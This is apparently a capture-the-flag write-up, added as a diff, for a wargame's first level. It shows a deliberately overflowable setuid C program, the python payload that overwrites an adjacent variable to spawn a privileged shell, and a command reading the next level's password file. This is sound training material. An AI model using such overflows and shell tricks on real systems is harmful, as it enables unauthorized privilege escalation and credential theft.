@@ -1,0 +1,54 @@
+rnia0@narnia:~$ ls -l /narnia/narnia0
+-r-sr-x--- 1 narnia1 narnia0 7568 Nov  9 15:08 /narnia/narnia0
+
+narnia0@narnia:~$ cat /narnia/narnia0.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+  long val=0x41414141;
+  char buf[20];
+
+  printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+  printf("Here is your chance: ");
+  scanf("%24s",&buf);
+
+  printf("buf: %s\n",buf);
+  printf("val: 0x%08x\n",val);
+
+  if(val==0xdeadbeef){
+        setreuid(geteuid(),geteuid());
+    system("/bin/sh");
+    }
+  else {
+    printf("WAY OFF!!!!\n");
+    exit(1);
+  }
+
+  return 0;
+}
+
+-== Overwriting buffer, but no persistent shell
+
+narnia0@narnia:~$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | /narnia/narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
+val: 0xdeadbeef
+
+-== Persistent shell by keeping file descriptor alive through cat
+
+narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat -) | /narnia/narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
+val: 0xdeadbeef
+ls
+narnia0    narnia1    narnia2  narnia3    narnia4    narnia5    narnia6    narnia7  narnia8
+narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
+id
+uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
+
+narnia0@narnia:/narnia$ ((python -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat -) | /narnia/narnia0)
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
+val: 0xdeadbeef
+cat /etc/narnia_pass/narnia1
